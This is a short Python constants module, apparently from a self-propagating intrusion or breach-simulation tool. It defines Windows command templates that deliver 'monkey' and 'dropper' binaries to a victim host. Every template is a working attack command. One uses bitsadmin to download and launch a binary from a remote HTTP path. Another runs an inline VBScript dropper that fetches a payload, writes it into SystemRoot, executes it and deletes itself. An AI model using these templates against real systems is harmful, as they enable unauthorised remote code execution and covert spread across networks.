__author__ = 'itamar'

MONKEY_ARG = "m0nk3y"
DROPPER_ARG = "dr0pp3r"
DROPPER_CMDLINE = 'cmd /c %%(dropper_path)s %s' % (DROPPER_ARG, )
MONKEY_CMDLINE = 'cmd /c %%(monkey_path)s %s' % (MONKEY_ARG, )
DROPPER_CMDLINE_DETACHED = 'cmd /c start cmd /c %%(dropper_path)s %s' % (DROPPER_ARG, )
MONKEY_CMDLINE_DETACHED = 'cmd /c start cmd /c %%(monkey_path)s %s' % (MONKEY_ARG, )
MONKEY_CMDLINE_HTTP = 'cmd.exe /c "bitsadmin /transfer Update /download /priority high %%(http_path)s %%(monkey_path)s&cmd /c %%(monkey_path)s %s"' % (MONKEY_ARG, )
RDP_CMDLINE_HTTP_BITS = 'bitsadmin /transfer Update /download /priority high %%(http_path)s !SystemRoot!\\%%(monkey_name)s&&start /b !SystemRoot!\\%%(monkey_name)s %s'  % (MONKEY_ARG, )
RDP_CMDLINE_HTTP_VBS = 'set o=!TMP!\!RANDOM!.tmp&@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>!o!&@echo objXMLHTTP.open "GET","%%(http_path)s",false>>!o!&@echo objXMLHTTP.send()>>!o!&@echo If objXMLHTTP.Status=200 Then>>!o!&@echo Set objADOStream=CreateObject("ADODB.Stream")>>!o!&@echo objADOStream.Open>>!o!&@echo objADOStream.Type=1 >>!o!&@echo objADOStream.Write objXMLHTTP.ResponseBody>>!o!&@echo objADOStream.Position=0 >>!o!&@echo objADOStream.SaveToFile "!SystemRoot!\\%%(monkey_name)s">>!o!&@echo objADOStream.Close>>!o!&@echo Set objADOStream=Nothing>>!o!&@echo End if>>!o!&@echo Set objXMLHTTP=Nothing>>!o!&@echo Set objShell=CreateObject("WScript.Shell")>>!o!&@echo objShell.Exec("cmd /c !SystemRoot!\\%%(monkey_name)s %s")>>!o!&start /b cmd /c cscript.exe //E:vbscript !o!^&del /f /q !o!' % (MONKEY_ARG, )

from host import VictimHost